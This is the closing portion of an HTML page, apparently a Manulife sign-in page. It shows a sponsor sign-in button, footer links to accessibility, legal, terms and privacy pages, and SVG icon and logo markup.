                                                                            <svg width="20px" height="20px" focusable="false" viewBox="0 0 20 20" version="1.1" xmlns="http://www.w3.org/2000/svg">
                                                                                <title></title>
                                                                                <g stroke="none" stroke-width="0" fill="none" fill-rule="evenodd">
                                                                                    <g transform="translate(-826.000000, -245.000000)" fill="none" fill-rule="nonzero">
                                                                                        <g transform="translate(836.000000, 255.000000) rotate(0.000000) translate(-836.000000, -255.000000) translate(826.000000, 245.000000)">
                                                                                            <g>
                                                                                                <path d="M10,2 C14.4,2 18,5.6 18,10 C18,14.4 14.4,18 10,18 C5.6,18 2,14.4 2,10 C2,5.6 5.6,2 10,2 L10,2 Z M10,0 C4.5,0 0,4.5 0,10 C0,15.5 4.5,20 10,20 C15.5,20 20,15.5 20,10 C20,4.5 15.5,0 10,0 L10,0 Z" class="manulifeIconSecondary-fill"></path>
                                                                                                <polygon points="13 9.6 13.5 10.1 12.8 10.8 12.8 10.8 9.4 14 8 12.6 10.6 10 8 7.4 9.4 6 13 9.6"></polygon>
                                                                                            </g>
                                                                                        </g>
                                                                                    </g>
                                                                                </g>
                                                                            </svg>
                                                                        </span>
                                                                    </div>
                                                                    <div class="sc-AxmLO gmtmqV">Sponsor Manulife ID sign in</div>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </main>
                                </div>
                                <div class="ContentPage__SideImage-sc-1bcibrd-3 hlsiKC"></div>
                            </div>
                        </div>
                        <div tabindex="-1" class="Layout__FooterWrapper-sc-3uqwjo-4 bMRGBP">
                            <footer id="footer-id-l7s60dd6" tabindex="-1" class="styledComponents__FooterWrapper-sc-1mnzuyu-0 kloZBI">
                                <div>
                                    <div class="styledComponents__FooterMiddle-sc-1mnzuyu-1 cA-dViF">
                                        <ul lang="en-CA" data-testid="sitelink-list" class="styledComponents__SiteLinkList-sc-1mnzuyu-2 hcRUxI">
                                            <li lang="en-CA" data-testid="sitelink-accessibility" class="styledComponents__SiteLink-sc-1mnzuyu-3 dTatrG">
                                                <span class="styledComponents__TextLinkWrapper-sc-1y3f8u0-0 enagxf">
                                                    <a aria-label="Accessibility Open in a new tab" id="footer-id-l7s60dd6-a-accessibility" target="_blank" rel="noopener noreferrer" href="https://www.manulife.ca/about-us/accessibility.html">
                                                        Accessibility
                                                        <span data-testid="external-icon-test-id" color="transparent" fill="#008048" width="1.25rem" height="1.25rem" aria-hidden="true" data-icon="external" opacity="1" class="styledComponents__ManulifeRoot-sc-1c8dbgg-1 dzFlvc">
                                                            <svg width="20" height="20" focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15 15">
                                                                <title></title>
                                                                <path d="M13,0H7V2h4.59l-4,4H0v9H9V7.43l4-4V8h2V0ZM7,13H2V8H7Z"></path>
                                                            </svg>
                                                        </span>
                                                    </a>
                                                </span>
                                            </li>
                                            <li lang="en-CA" data-testid="sitelink-legal" class="styledComponents__SiteLink-sc-1mnzuyu-3 dTatrG">
                                                <span class="styledComponents__TextLinkWrapper-sc-1y3f8u0-0 enagxf">
                                                    <a aria-label="Legal Open in a new tab" id="footer-id-l7s60dd6-a-legal" target="_blank" rel="noopener noreferrer" href="https://www.manulife.com/en/legal.html">
                                                        Legal
                                                        <span data-testid="external-icon-test-id" color="transparent" fill="#008048" width="1.25rem" height="1.25rem" aria-hidden="true" data-icon="external" opacity="1" class="styledComponents__ManulifeRoot-sc-1c8dbgg-1 dzFlvc">
                                                            <svg width="20" height="20" focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15 15">
                                                                <title></title>
                                                                <path d="M13,0H7V2h4.59l-4,4H0v9H9V7.43l4-4V8h2V0ZM7,13H2V8H7Z"></path>
                                                            </svg>
                                                        </span>
                                                    </a>
                                                </span>
                                            </li>
                                            <li lang="en-CA" data-testid="sitelink-toc" class="styledComponents__SiteLink-sc-1mnzuyu-3 dTatrG">
                                                <span class="styledComponents__TextLinkWrapper-sc-1y3f8u0-0 enagxf">
                                                    <a aria-label="Terms &amp; Conditions Open in a new tab" id="footer-id-l7s60dd6-a-toc" target="_blank" rel="noopener noreferrer" href="https://www.manulife.ca/about-us/secure-client-site-terms-and-conditions.html">
                                                        Terms &amp; Conditions
                                                        <span data-testid="external-icon-test-id" color="transparent" fill="#008048" width="1.25rem" height="1.25rem" aria-hidden="true" data-icon="external" opacity="1" class="styledComponents__ManulifeRoot-sc-1c8dbgg-1 dzFlvc">
                                                            <svg width="20" height="20" focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15 15">
                                                                <title></title>
                                                                <path d="M13,0H7V2h4.59l-4,4H0v9H9V7.43l4-4V8h2V0ZM7,13H2V8H7Z"></path>
                                                            </svg>
                                                        </span>
                                                    </a>
                                                </span>
                                            </li>
                                            <li lang="en-CA" data-testid="sitelink-privacy" class="styledComponents__SiteLink-sc-1mnzuyu-3 dTatrG">
                                                <span class="styledComponents__TextLinkWrapper-sc-1y3f8u0-0 enagxf">
                                                    <a aria-label="Privacy Policy Open in a new tab" id="footer-id-l7s60dd6-a-privacy" target="_blank" rel="noopener noreferrer" href="https://www.manulife.ca/privacy-policies.html">
                                                        Privacy Policy
                                                        <span data-testid="external-icon-test-id" color="transparent" fill="#008048" width="1.25rem" height="1.25rem" aria-hidden="true" data-icon="external" opacity="1" class="styledComponents__ManulifeRoot-sc-1c8dbgg-1 dzFlvc">
                                                            <svg width="20" height="20" focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15 15">
                                                                <title></title>
                                                                <path d="M13,0H7V2h4.59l-4,4H0v9H9V7.43l4-4V8h2V0ZM7,13H2V8H7Z"></path>
                                                            </svg>
                                                        </span>
                                                    </a>
                                                </span>
                                            </li>
                                        </ul>
                                    </div>
                                    <div class="styledComponents__FooterBottom-sc-1mnzuyu-5 lgxnnT">
                                        <svg data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 170.01 31.2" style="height: 20px;">
                                            <title>Manulife logo</title>
                                            <path d="M91.3 26.9V25a5.92 5.92 0 01-4.8 2.2c-2.9 0-5.2-1.8-5.2-4.9 0-3.8 3.5-5.2 7-5.5l1.3-.2c1.3-.1 1.8-.8 1.8-1.7 0-1.1-1-1.9-2.6-1.9a5.45 5.45 0 00-4.2 2.3l-2-2.4a7.83 7.83 0 016.4-2.8c3.8 0 5.9 1.9 5.9 5.2v11.6zm0-7.8l-2.5.3c-2.1.3-4 1-4 2.8a2.33 2.33 0 002.4 2.2h.1a5.26 5.26 0 004-2.2v-3.1zM101.7 26.9h-3.6V10.6h3.6v1.8a7.49 7.49 0 015.3-2.2c1.9 0 4.6 1.1 4.6 5.1v11.6H108V16.2c0-1.6-.7-3-2.3-3a7.48 7.48 0 00-4 1.9zM124.3 10.6h3.6v16.3h-3.7v-1.8a6.44 6.44 0 01-4.7 2.1c-2.1 0-5-1.1-5-5.2V10.6h3.6v10.3c0 1.9.8 3.2 2.5 3.2a5.32 5.32 0 003.8-2zM135.5 26.9h-3.6V5.4l3.6-3.6zM141.3 3.2a2.26 2.26 0 012.3 2.3 2.3 2.3 0 11-4.6 0 2.47 2.47 0 012.3-2.3zm1.9 23.7h-3.8V10.6h3.8zM154.6 13.6h-3.4v13.3h-3.6V13.6h-2.2v-3h2.2V7.2a4.83 4.83 0 014.6-5.1h.5a8.08 8.08 0 013.7.9l-1.1 2.8a3.61 3.61 0 00-2-.6 2.11 2.11 0 00-2.1 2.1v3.4h4.3zM158.9 19.7a4.27 4.27 0 004.1 4.5h.1a5.24 5.24 0 004.2-2.5l2.2 2.1a8.39 8.39 0 01-6.8 3.5c-4.7 0-7.6-3.5-7.6-8.5s3.1-8.5 7.7-8.5c4.3 0 7.4 2.8 7.2 9.5h-11.1zm7.4-2.7a3.59 3.59 0 00-3.3-3.9h-.2A4 4 0 00159 17zM60.7 26.9h-4V4.3h4.2l6.8 11.2 6.7-11.2h4.2V27h-4V10.9h-.1l-6.8 11.4-6.9-11.4v16z" fill="#fff"></path>
                                            <path fill="#00a758" d="M22.7 5.7v25.5l5.6-5.7V0l-5.6 5.7zM11.3 31.2l5.7-5.7V0l-5.7 5.7v25.5zM0 31.2l5.7-5.7V0L0 5.7v25.5z"></path>
                                        </svg>
                                        <span><span id="footer-id-l7s60dd6-copyright-year" aria-label="© 1999 - 2022" class="styledComponents__CopyrightYear-sc-1mnzuyu-7 bmSliR">© 1999-2022</span> <span id="footer-id-l7s60dd6-copyright-text">The Manufacturers Life Insurance Company</span></span>
                                    </div>
                                </div>
                            </footer>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    

</body></html></script></html>